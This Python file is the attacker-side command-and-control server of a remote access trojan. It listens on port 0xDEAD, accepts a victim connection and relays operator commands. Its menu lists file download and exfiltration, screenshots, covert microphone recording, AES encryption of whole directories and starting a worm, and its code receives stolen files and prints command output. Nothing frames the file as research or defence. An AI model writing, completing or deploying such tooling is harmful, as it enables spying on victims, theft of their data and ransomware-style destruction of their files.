from socket import socket, AF_INET, SOCK_STREAM
from time import sleep
from tqdm import tqdm
from errno import EPIPE
from os import system

SIZE = 0x400


def menu():  # helper
    print("download/send with absolute path to download file")
    print("screen to take screen")
    print("record to take microphone record -h hours -m minute -s seconds")
    print("encrypt '1 key iv path' to encrypt all files in this dirctory using aes using aes algorithm")
    print("encrypt '2 key iv name of file' to encrypt 1 file using aes algorithm")
    print("alert to change desktop background and start worm")
    print("use -q to exit")


def reset_connection():
    global conn, addr
    conn, addr = server.accept()


def recv_file():
    global addr, data, conn
    try:
        data = conn.recv(SIZE).decode().split("#^")[:0x2]  # recv name and size of file
        size, name = data
        size = int(size)
        if "/" in name:
            name = name.split("/")[-0x1]
        elif "\\" in name:
            name = name.split("\\")[-0x1]
        print("Name Of File: %s\nSize Of File: %d" % (name, size))
        progress = tqdm(
            range(size),
            f"Receiving {name}",
            unit="B",
            unit_scale=True,
            unit_divisor=SIZE,
        )  # to detrmin how many recv
        with open(name, "wb") as file:
            while True:
                data = conn.recv(SIZE)

                if not data:
                    break

                file.write(data)

                progress.update(SIZE)  # update how many time recv

    except Exception:
        pass


server = socket(AF_INET, SOCK_STREAM)  # tcp
addr = ("0.0.0.0", 0xDEAD)  # hacker ip and port
server.bind(addr)
server.listen()
print(f"[*] listening on port {0xdead}")
conn, addr = server.accept()
print(f"[*] start hacking")
state = ""
while True:
    try:
        data = input("> ")  # command
        if "-q" == data:  # exit
            conn.close()
            break
        if "-h" == data:
            menu()
            continue
        if "cls" == data:
            system("clear")
            continue
        if "record" == data.split()[0x0]:
            data = data.split()
            state = data[0x1]
            seconds = int(data[-0x1])
            if state == "-h":
                seconds *= 0xE10
            elif state == "-m":
                seconds *= 0x3C
            data = data[0x0] + " " + str(seconds)
        com = data
        data = data.encode()
        conn.send(data)
        if "record" == com.split()[0x0]:  # waiting for record
            print(
                "[*] Waiting For Record With Time {:02d}:{:02d}:{:02d}".format(
                    seconds // 0xE10, seconds // 0x3C % 0x3C, seconds % 0x3C
                )
            )

            sleep(seconds)
        if (
            not "download" in com
            and not "send" in com
            and not "screen" in com
            and not "record" in com
        ):  # recv data as msg bytes
            data = conn.recv(SIZE)
            alldata = b""
            try:
                while data:
                    alldata += data
                    conn.settimeout(0.5)  # time out to recive output
                    data = conn.recv(SIZE)
            except Exception:
                print(alldata.decode())
        else:
            recv_file()
    except IOError as error:
        if error.errno == EPIPE:
            reset_connection()
        else:
            print("[*] Error In Connection")
    except IndexError as index:
        print("[*] Enter Commend")
    except Exception as EX:
        print(EX)